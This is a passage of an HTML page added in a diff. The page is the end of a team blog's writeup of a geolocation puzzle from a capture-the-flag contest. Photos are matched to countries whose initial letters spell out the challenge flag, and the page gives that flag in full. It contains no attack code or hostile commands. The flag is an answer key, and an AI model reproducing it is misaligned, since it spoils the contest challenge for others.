+<li>Landmarks (confirmed by image search or otherwise)</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Letter</th>
+<th>Country</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong>B</strong></td>
+<td>Brazil</td>
+<td>Mureta da Urca</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>R</strong></td>
+<td>Russia</td>
+<td>Kremlin+Saint Basil&rsquo;s Cathedral</td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>_</strong></td>
+<td>Iceland</td>
+<td>Ring Road <a href="https://www.nomadicmatt.com/">crossref</a></td>
+</tr>
+<tr>
+<td>9</td>
+<td><strong>_</strong></td>
+<td>Monaco</td>
+<td>Monaco Cruise Port</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Legible text and less legible text</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Letter</th>
+<th>Country</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3</td>
+<td><strong>e</strong></td>
+<td>estonia</td>
+<td>Kalamaja</td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>K</strong></td>
+<td>Kenya</td>
+<td>&ldquo;Peri Peri Pizza&rdquo;, &ldquo;Third Street&rdquo;</td>
+</tr>
+<tr>
+<td>12</td>
+<td><strong>a</strong></td>
+<td>Austria</td>
+<td>&ldquo;Elektro weißensteiser&rdquo;, &ldquo;Nikolaus-Dumba-Straße&rdquo;</td>
+</tr>
+<tr>
+<td>14</td>
+<td>???</td>
+<td>Certain Spanish country</td>
+<td>&ldquo;V<strong>í</strong>a&rdquo; means road in Spanish</td>
+</tr>
+<tr>
+<td>15</td>
+<td><strong>b</strong></td>
+<td>Bulgaria</td>
+<td>&ldquo;за&hellip;&rdquo; <del>ИМД</del> (actually КМД), Google image search</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Other characteristics (often need cross-check)</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Letter</th>
+<th>Country</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4</td>
+<td><strong>A</strong></td>
+<td>Australia</td>
+<td>General outback</td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong>m</strong></td>
+<td>Mongolia</td>
+<td>Yurt (cross-checked by image search)</td>
+</tr>
+<tr>
+<td>10</td>
+<td><strong>s</strong></td>
+<td>Switzerland</td>
+<td>Flag (from a problem-setting perspective), overall household style and road mirror</td>
+</tr>
+<tr>
+<td>11</td>
+<td><strong>P</strong></td>
+<td>Poland</td>
+<td>Road pole (google image search)</td>
+</tr>
+</tbody>
+</table>
+<p>Now it is a guessing game, but there are plenty of ways to narrow the search.</p>
+<ul>
+<li>There are only &lt;150 countries with population &gt;= 1mil, all other countries are word boundaries</li>
+<li>Always look at the flag <code>BRe*K_m*_sPa**B**</code>.
+<ul>
+<li>4 is most likely A/a, with the general outback feel and the road characteristics =&gt; Australia</li>
+<li>8 is e/E/Y but Yemen is unlikely =&gt; e/E, <em>this is the only character I guessed at submission</em> (<em>post solve</em>: it&rsquo;s Eswatini)</li>
+<li>13 is America or Canada from image search (road characteristics) but <code>sPaA</code> doesn&rsquo;t make sense</li>
+<li>16, 17 are image-searched as albania and Russia respectively, but they just confirm my guess of <code>sPaCEbaR</code>, with Ecuador fitting 14.</li>
+</ul>
+</li>
+<li><a href="https://geohints.com">Geohints</a> can be useful but I didn&rsquo;t use it.</li>
+<li>The discord channel discussion has lots of useful info (after the CTF) as well</li>
+</ul>
+
+</div>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
+      <li><a href="https://b6a.black/tags/idek-ctf/">idek-ctf</a></li>
+    </ul>
+    <nav class="paginav">
+      <a class="next" href="https://b6a.black/posts/2023-01-10-asisctf/">
+        <span class="title">Next Page »</span>
+        <br>
+        <span>ASIS CTF 2022 Finals Writeup</span>
+      </a>
+    </nav>
+  </footer>
+</article>
+<aside class="toc-container">
+  <a href="#" style="text-decoration: none; font-weight: 700;">
+    idekCTF 2022* Writeup
+  </a>
+  <div class="js-toc"></div>
+</aside>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+    headingSelector: 'h1, h2, h3, h4',
+    orderedList: false,
+    headingLabelCallback: s => s.substr(0, s.length-1),
+    collapseDepth: 2
+  });
+</script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js"> </script>
+<script type="text/javascript">
+  (function () {
+    const vizPrefix = "language-viz-";
+    Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
+      let engine;
+      x.getAttribute("class").split(" ").forEach(function (cls) {
+        if (cls.startsWith(vizPrefix)) {
+          engine = cls.substr(vizPrefix.length);
+        }
+      });
+      const image = new DOMParser().parseFromString(Viz(x.innerText, { format: "svg", engine: engine }), "image/svg+xml");
+      x.parentNode.insertBefore(image.documentElement, x);
+      x.style.display = 'none'
+      x.parentNode.style.backgroundColor = "white"
+    });
+  })();
+</script>
+    </main><footer class="footer">
+    <span>&copy; 2023 <a href="https://b6a.black/">Black Bauhinia</a></span>
+    <span>&middot;</span>
+    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
+    <span>&middot;</span>
+    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
+    <button class="top-link" id="top-link" type="button" accesskey="g">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+    </button>
+</a>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>
+
+
+
+<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script>
+    window.onload = function () {
+        if (localStorage.getItem("menu-scroll-position")) {
+            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+    function menu_on_scroll() {
+        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
+    }
+
+</script>
+
+</body>
+
+</html>
